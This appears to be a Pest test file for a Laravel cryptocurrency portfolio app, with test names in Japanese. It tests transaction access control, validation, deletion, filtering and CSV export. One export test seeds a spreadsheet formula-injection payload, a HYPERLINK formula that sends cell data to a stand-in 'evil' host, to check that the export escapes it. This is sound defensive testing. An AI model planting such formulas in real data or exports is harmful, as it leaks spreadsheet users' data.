<?php

use App\Models\Asset;
use App\Models\AssetPrice;
use App\Models\Exchange;
use App\Models\Portfolio;
use App\Models\Transaction;
use App\Models\User;

test('ゲストは取引一覧にアクセスできない', function () {
    $this->get(route('transactions.index'))
        ->assertRedirect(route('login'));
});

test('自分の取引のみ一覧に表示される', function () {
    $me = User::factory()->create();
    $other = User::factory()->create();

    $myPortfolio = Portfolio::factory()->for($me)->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();

    Transaction::factory()->for($myPortfolio)->for($asset)->count(2)->create();
    Transaction::factory()->for($otherPortfolio)->for($asset)->count(3)->create();

    $this->actingAs($me)
        ->get(route('transactions.index'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('Transactions/Index')
            ->has('transactions.data', 2)
        );
});

test('取引作成画面は複数の価格履歴があっても PostgreSQL で曖昧列エラーにならない', function () {
    $user = User::factory()->create();
    Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    AssetPrice::factory()->for($asset)->create([
        'recorded_at' => now()->subDays(2),
        'price_jpy' => 1_000_000,
    ]);
    AssetPrice::factory()->for($asset)->create([
        'recorded_at' => now()->subDay(),
        'price_jpy' => 2_000_000,
    ]);

    $this->actingAs($user)
        ->get(route('transactions.create'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('Transactions/Create')
            ->has('assets')
        );

    $asset->load('latestPrice');
    expect((float) $asset->latestPrice->price_jpy)->toBe(2_000_000.0);
});

test('取引を作成できる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    $exchange = Exchange::factory()->create();

    $payload = [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'exchange_id' => $exchange->id,
        'type' => Transaction::TYPE_BUY,
        'amount' => 1.5,
        'price_jpy' => 1_000_000,
        'fee_jpy' => 100,
        'executed_at' => now()->subHour()->toDateTimeString(),
        'note' => '初回購入',
    ];

    $this->actingAs($user)
        ->post(route('transactions.store'), $payload)
        ->assertRedirect()
        ->assertSessionHas('success');

    $this->assertDatabaseHas('transactions', [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'type' => 'buy',
        'amount' => 1.5,
    ]);
});

test('他ユーザーのポートフォリオを指定して取引を作成できない', function () {
    $me = User::factory()->create();
    $other = User::factory()->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();

    $this->actingAs($me)
        ->from(route('transactions.create'))
        ->post(route('transactions.store'), [
            'portfolio_id' => $otherPortfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 1,
            'price_jpy' => 1000,
            'executed_at' => now()->toDateTimeString(),
        ])
        ->assertRedirect(route('transactions.create'))
        ->assertSessionHasErrors('portfolio_id');

    $this->assertDatabaseCount('transactions', 0);
});

test('数量や日時のバリデーションが効く', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();

    $this->actingAs($user)
        ->from(route('transactions.create'))
        ->post(route('transactions.store'), [
            'portfolio_id' => $portfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 0,
            'price_jpy' => -1,
            'executed_at' => now()->addDay()->toDateTimeString(),
        ])
        ->assertRedirect(route('transactions.create'))
        ->assertSessionHasErrors(['amount', 'price_jpy', 'executed_at']);
});

test('他ユーザーの取引は編集・更新・削除できない', function () {
    $me = User::factory()->create();
    $myPortfolio = Portfolio::factory()->for($me)->create();
    $other = User::factory()->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();
    $tx = Transaction::factory()->for($otherPortfolio)->for($asset)->create();

    $this->actingAs($me)
        ->get(route('transactions.edit', $tx))
        ->assertForbidden();

    $this->actingAs($me)
        ->put(route('transactions.update', $tx), [
            'portfolio_id' => $myPortfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 99,
            'price_jpy' => 1,
            'executed_at' => now()->toDateTimeString(),
        ])
        ->assertForbidden();

    $this->actingAs($me)
        ->delete(route('transactions.destroy', $tx))
        ->assertForbidden();
});

test('自分の取引を削除できる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    $tx = Transaction::factory()->for($portfolio)->for($asset)->create();

    $this->actingAs($user)
        ->delete(route('transactions.destroy', $tx))
        ->assertRedirect();

    $this->assertDatabaseMissing('transactions', ['id' => $tx->id]);
});

test('取引CSVエクスポートで数式インジェクションがエスケープされる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create(['name' => '=evil_portfolio']);
    $asset = Asset::factory()->create(['symbol' => 'BTC', 'name' => 'Bitcoin']);
    Transaction::factory()
        ->for($portfolio)
        ->for($asset)
        ->buy()
        ->create([
            'note' => '=HYPERLINK("http://evil/?x="&A1,"click")',
            'price_jpy' => 1000,
            'fee_jpy' => 0,
            'amount' => 1,
        ]);

    $response = $this->actingAs($user)->get(route('transactions.export'));
    $response->assertOk();

    $csv = $response->streamedContent();

    // 先頭に ' が付いていること（Excelが数式として評価しない）
    expect($csv)->toContain("'=HYPERLINK(");
    expect($csv)->toContain("'=evil_portfolio");

    // = で始まる形のまま（サニタイズ前）の値がそのままは出ていないこと
    expect($csv)->not->toMatch('/(^|,|")=HYPERLINK/m');
});

test('種別と銘柄でフィルタできる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $btc = Asset::factory()->create(['symbol' => 'BTC']);
    $eth = Asset::factory()->create(['symbol' => 'ETH']);

    Transaction::factory()->for($portfolio)->for($btc)->buy()->create();
    Transaction::factory()->for($portfolio)->for($btc)->sell()->create();
    Transaction::factory()->for($portfolio)->for($eth)->buy()->create();

    $this->actingAs($user)
        ->get(route('transactions.index', ['asset_id' => $btc->id, 'type' => 'buy']))
        ->assertOk()
        ->assertInertia(fn ($page) => $page->has('transactions.data', 1));
});
